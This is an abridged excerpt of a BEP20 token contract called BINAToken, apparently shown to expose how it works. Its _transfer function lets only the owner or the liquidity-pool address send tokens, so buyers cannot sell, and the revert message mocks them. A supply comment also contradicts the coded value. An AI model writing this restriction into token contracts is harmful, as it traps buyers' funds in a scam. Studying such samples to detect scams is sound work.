...
contract BINAToken is Context, IBEP20, Ownable , Pausable {
  ...
  constructor() {
    ...
    _symbol = "BINAToken";
    _decimals = 18;
    _totalSupply = 1000000000 * 10 ** 18; // 10,000,000,000
  ...
  */
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    require((sender == owner() || sender == _lp_address), "TRANFER FAILED :D");
  ...
  function _setlp(address lp) internal {
    require(lp != address(0), "BEP20: setlp to the zero address");
    _lp_address = lp;
  }
